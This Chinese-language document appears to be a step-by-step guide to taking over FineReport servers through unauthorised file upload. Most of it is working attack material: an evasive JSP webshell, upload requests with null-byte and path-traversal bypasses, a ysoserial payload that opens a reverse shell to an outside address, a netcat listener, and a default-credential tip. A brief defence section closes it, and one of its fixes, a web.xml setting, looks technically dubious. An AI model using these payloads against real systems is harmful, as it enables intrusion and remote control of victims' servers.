针对 **帆软 FineReport** 的未授权任意文件上传漏洞 GetShell 方法如下。FineReport 使用 Tomcat 作为 Web 容器，且具有特定的目录结构，需精确上传到可执行路径：

---

### **关键路径说明**
| **类型**       | **路径**                                      | **说明**                                                                 |
|----------------|----------------------------------------------|--------------------------------------------------------------------------|
| **Web 根目录** | `[FineReport安装目录]/webapps/webroot/`       | FineReport 的 Web 应用根目录（不是 Tomcat 默认的 `ROOT`）                |
| **上传入口**   | `/WebReport/ReportServer`                     | 常见未授权上传接口（如 `op=fr_remote`、`op=chart_save` 等）              |
| **有效路径**   | `webapps/webroot/help/`                       | 默认有读写权限，可上传 JSP Webshell                                      |
| **报表路径**   | `webapps/webroot/reportlets/`                 | 存储报表文件（`.cpt`），可尝试覆盖或上传 JSP                             |

---

### **详细利用步骤**

#### 1. **准备 JSP Webshell**
使用免杀 Webshell（避免被安全设备检测）：
```jsp
<%!
    class U extends ClassLoader {
        U(ClassLoader c) { super(c); }
        public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
    }
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("pass");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```
> 此 Webshell 通过类加载器执行 Base64 编码的字节码，可绕过常见 WAF。

#### 2. **定位上传接口**
FineReport 常见未授权上传接口：
```http
POST /WebReport/ReportServer?op=fr_remote&cmd=design_save HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<JSP_WEBSHELL_CONTENT>
------WebKitFormBoundaryABC123--
```
> 其他可能接口：`op=chart_save`、`op=svg`、自定义报表上传等。

#### 3. **绕过上传限制**
- **后缀名绕过**：FineReport 可能限制 `.jsp`，尝试以下技巧：
  ```http
  filename="shell.jsp%00.png"     # 利用空字节截断
  filename="../../webroot/help/shell.jsp"  # 路径遍历到可执行目录
  ```
- **Content-Type 绕过**：
  ```http
  Content-Type: image/png         # 伪装为图片
  ```

#### 4. **上传到有效路径**
**首选路径**：`/help/` 目录（通常有写权限+执行权限）
```http
filename="../../webroot/help/shell.jsp"
```
> 若失败，尝试覆盖报表文件：
> ```http
> filename="../../webroot/reportlets/shell.jsp"  # 覆盖报表文件（风险较高）
> ```

#### 5. **访问 Webshell**
- **标准路径**：
  ```
  http://target:port/webroot/help/shell.jsp?pass=<base64_encoded_payload>
  ```
- **报表路径**：
  ```
  http://target:port/webroot/reportlets/shell.jsp?pass=<base64_encoded_payload>
  ```

#### 6. **执行命令**
生成 **Base64 编码的字节码**（使用 [ysoserial](https://github.com/frohoff/ysoserial)）：
```bash
# 生成反弹 Shell 的 CommonsBeanutils1 载荷
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" | base64 -w 0
```
> 替换 `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS80NDQ0IDA+JjE=` 为你的反向 Shell 命令的 Base64。

**访问 URL**：
```
http://target:8080/webroot/help/shell.jsp?pass=rO0ABXNyADRzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmJ...（长Base64）
```

#### 7. **获取交互式 Shell**
在攻击机监听：
```bash
nc -lvnp 4444
```

---

### **FineReport 特定技巧**
1. **利用报表文件（.cpt）**  
   上传恶意 `.cpt` 报表文件（需后台权限编辑），但未授权上传通常不可行。

2. **内存马注入**  
   若无法上传文件，可尝试通过上传接口注入内存马（需利用 Java 反序列化或表达式注入）。

3. **默认密码与配置**  
   检查 FineReport 后台（`/webroot/decision`）：
   - 默认账号：`admin`/`空密码`
   - 安装后未修改密码可直接登录部署 Webshell。

---

### **防御建议**
1. **升级到最新版本**：修复已知漏洞（如 FR 2020-2022 多个上传漏洞）。
2. **禁用危险接口**：在 `fr-config.xml` 中关闭 `fr_remote` 等接口。
3. **目录权限控制**：
   ```xml
   <!-- 在 Tomcat 的 web.xml 中禁止执行 -->
   <context-param>
     <param-name>readonly</param-name>
     <param-value>true</param-value>
   </context-param>
   ```
4. **WAF 规则**：拦截 `../`、`.jsp` 等关键字符。

> **注意**：实际路径可能因版本和安装方式（独立 Tomcat/嵌入式）差异，需结合报错信息调整。
